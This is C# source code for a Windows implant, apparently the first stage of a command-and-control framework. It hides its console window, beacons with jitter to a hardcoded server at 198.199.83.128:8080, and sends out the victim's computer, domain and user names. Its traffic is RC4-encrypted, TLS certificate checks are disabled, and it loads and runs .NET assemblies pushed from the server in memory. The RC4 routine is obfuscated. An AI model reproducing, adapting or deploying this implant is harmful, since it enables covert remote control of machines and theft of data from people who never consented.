#define DEBUG

using System;
using System.Collections.Generic;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Security.Cryptography;
using System.Net;
using System.Net.Security;
using System.Web.Script.Serialization;

namespace Stage0_CSharp
{
#if DEBUG
    class DebugPrint
    {
        public static void Print(string data)
        {
            using (StreamWriter sw = File.AppendText("log.txt"))
            {
                sw.WriteLine(data);
            }
        }
    }
#endif
    public struct MODULEINFO
    {
        public string Name;
        public byte[] assembly;
    }
    public struct EXECUTEINFO
    {
        public Guid guid;
        public Thread thread;
        public bool isActive;
    }

    public struct C2INFO
    {
        public string c2url;
        public string fronting;
        public string path;
        public byte[] key;
        public int delay;
        public int jitter;
    }

    public class NetworkData
    {
        public string UUID
        {
            get;
            set;
        }
        public string ID
        {
            get;
            set;
        }
        public string Data
        {
            get;
            set;
        }
    }

    class BufferedOutput
    {
        public static StringWriter sw;
        public static StringBuilder sb;
        public static bool isLocked;

        public static void WriteOutput(string output)
        {

            if (!BufferedOutput.isLocked)
            {
                if (output == null)
                {
                    BufferedOutput.sb.AppendLine(output);
                }
                else
                {
                    BufferedOutput.sb.AppendLine(BufferedOutput.sw.ToString());
                    BufferedOutput.FlushSw();
                }
            }
            else
            {
                BufferedOutput.WriteOutput(output);
            }
        }

        public static void SetConsoleOutput()
        {
            if (BufferedOutput.sw == null)
            {
                BufferedOutput.sw = new StringWriter();
            }
            if (BufferedOutput.sb == null)
            {
                BufferedOutput.isLocked = false;
                BufferedOutput.sb = new StringBuilder();
            }


            Console.SetError(BufferedOutput.sw);
            Console.SetOut(BufferedOutput.sw);
        }

        public static string GetBuffer()
        {
            BufferedOutput.isLocked = true;
            string output = BufferedOutput.sb.ToString();
            BufferedOutput.FlushSb();
            BufferedOutput.isLocked = false;
            return output;
        }

        public static void FlushSb()
        {
            BufferedOutput.sb.Clear();
        }

        public static void FlushSw()
        {
            BufferedOutput.sw.Flush();
        }
    }
    class ModuleManager
    {
        private List<MODULEINFO> modules = new List<MODULEINFO>();

        public byte[] Get(string name)
        {
            if (modules.Contains(new MODULEINFO() { Name = name }))
            {
                MODULEINFO mi = modules.Find(m => m.Name == name);
                return mi.assembly;
            }
            return new byte[0];
        }

        public bool Exists(string name)
        {
            if (modules.Contains(new MODULEINFO() { Name = name }))
            {
                return true;
            }
            return false;
        }

        public bool Add(MODULEINFO mi)
        {
            if (!modules.Contains(new MODULEINFO() { Name = mi.Name }))
            {
                modules.Add(mi);
                return true;
            }
            return false;
        }

        public void Encrypt(string Name)
        {
            // implement ProtectedMemory encyption
        }

        public void Decrypt(string Name)
        {
            // implement ProtectedMemory decryption
        }
    }

    class ThreadManager
    {
        [DllImport("shell32.dll", SetLastError = true)]
        static extern IntPtr CommandLineToArgvW([MarshalAs(UnmanagedType.LPWStr)] string lpCmdLine, out int pNumArgs);

        private List<EXECUTEINFO> threads = new List<EXECUTEINFO>();

        public static Guid GenerateGuid()
        {
            return Guid.NewGuid();
        }

        public void Flush()
        {
            foreach (EXECUTEINFO ei in threads)
            {
                if (!ei.isActive)
                {
                    threads.Remove(new EXECUTEINFO() { guid = ei.guid });
                }
            }
        }

        public EXECUTEINFO GetInstance(Guid guid)
        {
            if (threads.Contains(new EXECUTEINFO() { guid = guid }))
            {
                return threads.Find(e => e.guid == guid);
            }
            return new EXECUTEINFO();
        }
        public int GetCount()
        {
            return threads.Count;
        }

        public void Update(Guid guid, EXECUTEINFO ei)
        {
            if (threads.Contains(new EXECUTEINFO() { guid = guid }))
            {
                threads[threads.FindIndex(e => e.guid == guid)] = ei;
            }
            else
            {
                threads.Add(ei);
            }
        }

        public bool Execute(byte[] assembly, string args, Guid guid)
        {
            bool bSuccess = true;
            EXECUTEINFO ei = new EXECUTEINFO();
            ei.isActive = true;

            ei.guid = guid;
            try
            {
                ei.thread = new Thread(() => InternalExecute(assembly, args, ei));
                threads.Add(ei);

            }
            catch (Exception e)
            {
                BufferedOutput.WriteOutput(e.Message);
                bSuccess = false;
            }
            return bSuccess;
        }

        private bool InternalExecute(byte[] assembly, string args, EXECUTEINFO ei)
        {
            bool bSuccess = true;
            List<string> processArgs = new List<string>(StringToArgsArray(args));

            Assembly a = Assembly.Load(assembly);
            MethodInfo method = a.EntryPoint;
            if (method != null)
            {
                object o = a.CreateInstance(method.Name);
                method.Invoke(null, new object[] { (object[])processArgs.ToArray() });
                ei.isActive = false;
            }
            else
            {
                ei.isActive = false;
                bSuccess = false;
            }

            return bSuccess;
        }

        private string[] StringToArgsArray(string data)
        {
            int size;
            IntPtr output = CommandLineToArgvW(data, out size);
            if (output != IntPtr.Zero)
            {
                string[] args = new string[size];
                for (int i = 0; i < args.Length; i++)
                {
                    IntPtr m = Marshal.ReadIntPtr(output, i * IntPtr.Size);
                    args[i] = Marshal.PtrToStringUni(m);
                }
                return args;
            }
            return new string[0];
        }

    }

    class CommandParser
    {
        private byte[] key;
        public CommandParser(byte[] rc4key)
        {
            key = rc4key;
        }

        public static NetworkData Deseralize(string data)
        {
            var json = new JavaScriptSerializer();
            json.MaxJsonLength = Int32.MaxValue;
            return json.Deserialize<NetworkData>(data);
        }

        public static byte[] Serialize(NetworkData nd)
        {
            var json = new JavaScriptSerializer();
            json.MaxJsonLength = Int32.MaxValue;
            return Encoding.ASCII.GetBytes(json.Serialize(nd).ToString());
        }

        public string[] SplitCommand(string data, int max = 2)
        {
            return data.Split(new char[] { ' ' }, max);
        }

        public string Decrypt(string base64)
        {
            byte[] data = Convert.FromBase64String(base64);
            return Encoding.ASCII.GetString(RC4.Encrypt(key, data));
        }
    }

    class Networking
    {
        private string host;
        private byte[] key;
        private string id;
        private string c2url;
        private string path;
        public Networking(string url, string fronting, string arbitraryPath, byte[] rc4Key)
        {
            c2url = url;
            host = fronting;
            path = arbitraryPath;
            key = rc4Key;

            ServicePointManager.ServerCertificateValidationCallback = new RemoteCertificateValidationCallback(delegate {
                return true;
            });
        }

        public string SendRequest(string data, string guid)
        {
#if DEBUG
            DebugPrint.Print(String.Format("SendRequest: {0}", data));
#endif
            string url = String.Format("{0}/{1}", c2url, path);
            string payload = "";
            string output = "";
            HttpWebRequest hwr = (HttpWebRequest)WebRequest.Create(url);
            Stream s = null;
            StreamReader sr = null;

            hwr.Method = "POST";
            hwr.UserAgent = Environment.OSVersion.ToString();
            hwr.Timeout = 10000;
            hwr.ContentType = "application/json";
            hwr.Host = host;
            hwr.Proxy.Credentials = CredentialCache.DefaultNetworkCredentials;

            if (data != null)
            {
                payload = Convert.ToBase64String(RC4.Encrypt(key, Encoding.ASCII.GetBytes(data)));
            }

            NetworkData nd = new NetworkData
            {
                UUID = guid,
                ID = id,
                Data = payload
            };

            byte[] serialized = CommandParser.Serialize(nd);

            try
            {
                s = hwr.GetRequestStream();
                s.Write(serialized, 0, serialized.Length);
            }
            catch (Exception e)
            {
                SendRequest(e.Message, guid);
            }
            finally
            {
                if (s != null)
                {
                    s.Dispose();
                }
            }

            try
            {
                s = hwr.GetResponse().GetResponseStream();
                sr = new StreamReader(s);
                output = sr.ReadToEnd();
            }
            catch
            {

            }
            return output;
        }

        public void Register()
        {
            string data;
            id = Helper.RandomString(12);
            data = String.Format("register {0} {1}", id, Helper.GetInfo());
#if DEBUG
            DebugPrint.Print(String.Format("Registering shell: {0}", data));
#endif
            SendRequest(data, null);
        }
    }

    class Helper
    {
        public static string GetInfo()
        {
            return String.Format("{0} {1}\\{2}", Environment.GetEnvironmentVariable("COMPUTERNAME"), Environment.GetEnvironmentVariable("USERDOMAIN"), Environment.GetEnvironmentVariable("USERNAME"));
        }

        public static string RandomString(int size)
        {
            string charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
            StringBuilder sb = new StringBuilder();
            Random r = new Random();
            for (int i = 0; i < size; i++)
            {
                sb.Append(charset[r.Next(charset.Length - 1)]);
            }
            return sb.ToString();
        }

        public static int RandomJitter(int delay, int jitter)
        {

            Random r = new Random();
            return r.Next((int)Math.Round((double)(100 * jitter) / delay));
        }

        public static string GenerateGUID()
        {
            return Guid.NewGuid().ToString();
        }
    }

    class RC4
    {
        public static byte[] VAR17(byte[] VAR18, byte[] VAR19)
        {
            int VAR20, VAR21, VAR22, VAR23, VAR24;
            int[] VAR25, VAR26;
            byte[] VAR27;
            VAR25 = new int[256];
            VAR26 = new int[256];
            VAR27 = new byte[VAR19.Length];
            for (VAR21 = 0; VAR21 < 256; VAR21++)
            {
                VAR25[VAR21] = VAR18[VAR21 % VAR18.Length];
                VAR26[VAR21] = VAR21;
            }
            for (VAR22 = VAR21 = 0; VAR21 < 256; VAR21++)
            {
                VAR22 = (VAR22 + VAR26[VAR21] + VAR25[VAR21]) % 256;
                VAR24 = VAR26[VAR21];
                VAR26[VAR21] = VAR26[VAR22];
                VAR26[VAR22] = VAR24;
            }
            for (VAR20 = VAR22 = VAR21 = 0; VAR21 < VAR19.Length; VAR21++)
            {
                VAR20++;
                VAR20 %= 256;
                VAR22 += VAR26[VAR20];
                VAR22 %= 256;
                VAR24 = VAR26[VAR20];
                VAR26[VAR20] = VAR26[VAR22];
                VAR26[VAR22] = VAR24;
                VAR23 = VAR26[((VAR26[VAR20] + VAR26[VAR22]) % 256)];
                VAR27[VAR21] = (byte)(VAR19[VAR21] ^ VAR23);
            }
            return VAR27;
        }
        public static byte[] Encrypt(byte[] key, byte[] data)
        {
            try
            {
                return VAR17(key, data);
            }
            catch
            {
                return new byte[0];
            }
        }
    }
    class Program
    {
        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();
        static void Main(string[] args)
        {
            ShowWindow(GetConsoleWindow(), 0);
            bool bExit = false;
            C2INFO c2 = new C2INFO();
            c2.c2url = "http://198.199.83.128:8080";
            c2.fronting = "198.199.83.128";
            c2.path = "test";
            c2.key = Encoding.ASCII.GetBytes("ycWkTmGPHgPfEpGyARUrbStx");
            c2.delay = 10000;
            c2.jitter = 20;

            string[] data;
            ThreadManager tm = new ThreadManager();
            ModuleManager mm = new ModuleManager();
            Networking n = new Networking(c2.c2url, c2.fronting, c2.path, c2.key);
            CommandParser cp = new CommandParser(c2.key);
            n.Register();

            BufferedOutput.SetConsoleOutput();
            while (!bExit)
            {
                NetworkData nd = new NetworkData();
                string output;
                try
                {
                    output = n.SendRequest(null, null);
#if DEBUG
                    DebugPrint.Print(String.Format("Main raw JSON: {0}", output));
#endif
                    nd = CommandParser.Deseralize(output);
#if DEBUG
                    DebugPrint.Print(String.Format("Main JSON data: {0}", nd.Data));
#endif
                    if (nd.Data.Length > 0)
                    {
                        nd.Data = cp.Decrypt(nd.Data);
#if DEBUG
                        DebugPrint.Print(String.Format("Main data decrypted: {0}", nd.Data));
#endif
                        string[] command = cp.SplitCommand(nd.Data);
                        if (command[0].Equals("delay"))
                        {
                            c2.delay = Convert.ToInt32(command[1]);
                        }
                        else if (command[0].Equals("exit"))
                        {
                            bExit = true;
                        }

                        else if (command[0].Equals("call"))
                        {
                            data = cp.SplitCommand(command[1]);
                            if (mm.Exists(data[0]))
                            {
                                byte[] assembly = mm.Get(data[0]);
                                tm.Execute(assembly, data[1], ThreadManager.GenerateGuid());
                            }
                            else
                            {
                                n.SendRequest("error 1", nd.UUID);
                            }
                        }
                        else if (command[0].Equals("module"))
                        {
                            MODULEINFO mi = new MODULEINFO();
                            data = cp.SplitCommand(command[1]);
                            mi.Name = data[0];
                            mi.assembly = Convert.FromBase64String(data[1]);
                            mm.Add(mi);
                        }
                        else if (command[0].Equals("exists"))
                        {
                            bool exists = false;
                            exists = mm.Exists(command[1]);
                            n.SendRequest(String.Format("internal exists {0}", exists), nd.UUID);
                        }
                        else
                        {
                            n.SendRequest(String.Format("'{0}' core command not found.", command[0]), nd.UUID);
                        }
                    }
                }
                catch (Exception e)
                {
                    n.SendRequest(e.Message, Helper.GenerateGUID());
                }

                BufferedOutput.WriteOutput(null);
                output = BufferedOutput.GetBuffer();

                try
                {
                    n.SendRequest(output, nd.UUID);
                }
                catch
                {

                }
                tm.Flush();
                Thread.Sleep(c2.delay + Helper.RandomJitter(c2.delay, c2.jitter));
            }
        }
    }
}
